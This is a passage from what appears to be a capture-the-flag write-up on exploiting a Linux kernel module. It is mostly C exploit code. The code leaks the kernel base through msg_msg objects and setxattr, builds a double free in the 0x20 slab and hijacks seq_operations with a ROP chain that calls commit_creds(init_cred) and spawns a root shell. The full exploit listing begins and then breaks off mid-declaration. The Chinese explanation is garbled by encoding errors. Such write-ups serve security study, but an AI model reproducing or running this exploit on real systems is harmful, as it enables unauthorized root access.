class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1050</span>;</span><br><span class="line">    fake_msg_header-&gt;next=page_msg<span class="number">-0x10</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1050</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;cccccccccccccccc&quot;</span>,<span class="number">0x10</span>))&#123;</span><br><span class="line">            target_obj=re_buf[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m target_obj_addr:%p \e[0m\n&quot;</span>,target_obj);</span><br></pre></td></tr></table></figure>

<h3 id="äºŒ-ä»»æ„free"><a href="#äºŒ-ä»»æ„free" class="headerlink" title="äºŒ.ä»»æ„free"></a>äºŒ.ä»»æ„free</h3><p>åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†<code>target_obj</code>çš„åœ°å€äº†ï¼Œè¿™ä¸ªobjçš„å¤§å°æ˜¯0x20çš„ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨msgrcv()çš„æ—¶å€™ï¼Œå¦‚æœä¸ä½¿ç”¨<code>MSG_COPY</code>çš„è¯ï¼ŒæŸ¥æ‰¾åˆ°çš„<code>msg</code>æ˜¯ä¼šè¢«è„±é“¾ç„¶åfreeæ‰çš„ï¼Œæ‰€ä»¥å¦‚æœæŠŠmsg_id[0]çš„nextå¡«ä¸Štarget_objçš„åœ°å€ï¼Œé‚£msgrcv<code>msg_id[0]</code>çš„æ—¶å€™å°±æŠŠtarget_objç»™é‡Šæ”¾æ‰äº†ï¼Œä½†æ˜¯å…¶å®target_objè¿˜åœ¨msg_id[1]çš„ç¬¬äºŒä¸ªmsgçš„æ®µä¸Šï¼Œæ‰€ä»¥è¿˜å¯ä»¥è¢«freeä¸€æ¬¡ï¼Œè¿™å°±å¯ä»¥æ„é€ å‡ºdoublefreeäº†ã€‚æ„é€ å¦‚ä¸‹ã€‚</p>
<p>æ³¨æ„å†…æ ¸æ˜¯ä¼šæ£€æŸ¥doublefreeçš„ï¼Œä½†æ˜¯æ£€æŸ¥ä¸æ˜¯å¾ˆä¸¥æ ¼ï¼Œå°±å’Œglibcçš„fastbinä¸€æ ·ï¼Œæ‰€ä»¥æ„é€ å‡ºA-&gt;B-&gt;Aå°±å¥½äº†ã€‚å‰©ä¸‹ä¸¤ä¸ªmsgå°±æ˜¯ä¸ºäº†æ„é€ <code>A-&gt;B-&gt;A</code>çš„ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221120173429967.png" alt="image-20221120173429967"></p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_msg_header-&gt;ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header-&gt;next=target_obj;</span><br><span class="line">    fake_msg_header-&gt;security=<span class="number">0</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">2</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1008</span>,<span class="number">4</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">3</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">1</span>,IPC_NOWAIT | MSG_NOERROR);</span><br></pre></td></tr></table></figure>



<h3 id="ä¸‰-åŠ«æŒç¨‹åºæµ"><a href="#ä¸‰-åŠ«æŒç¨‹åºæµ" class="headerlink" title="ä¸‰.åŠ«æŒç¨‹åºæµ"></a>ä¸‰.åŠ«æŒç¨‹åºæµ</h3><p>ç°åœ¨0x20çš„slabçš„freelistä¸Šå°±æœ‰è¿™æ ·çš„é“¾å­<code>A-&gt;B-&gt;A</code>,è¿™æ ·å°±å¥½åŠäº†ï¼Œå…ˆç”³è¯·ä¸€æ¬¡<code>seq_operation</code>ç„¶åç¬¬ä¸‰æ¬¡ç”³è¯·åˆèƒ½ç”³è¯·è¿™ä¸ªseq_operationçš„objäº†ï¼Œå°±èƒ½ä¿®æ”¹å‡½æ•°æŒ‡é’ˆåŠ«æŒç¨‹åºæµäº†ã€‚</p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> seq_operation[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    add_rsp_0x108_pop_3=add_rsp_0x108_pop_3-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    pop_rdi_ret=pop_rdi_ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    commit_cred=commit_cred-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    kpti_addr=kpti_addr-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    ret=ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line"></span><br><span class="line">    seq_operation[<span class="number">0</span>]=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;seq&quot;</span>, seq_operation, <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,  kpti_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,  0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_obj=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> seq_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x108_pop_3=<span 